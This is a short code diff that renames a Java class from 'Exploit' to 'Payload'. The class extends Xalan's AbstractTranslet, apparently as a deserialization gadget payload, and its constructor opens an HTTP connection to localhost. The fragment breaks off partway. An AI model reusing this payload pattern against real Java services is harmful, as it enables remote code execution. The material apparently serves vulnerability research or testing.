@@ -3,8 +3,8 @@ package sample;
 import java.io.*;
 import java.net.*;
 
-public class Exploit extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
-    public Exploit() throws Exception {
+public class Payload extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
+    public Payload() throws Exception {
         StringBuilder result = new StringBuilder();
         URL url = new URL("http://localhost:8080/");
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
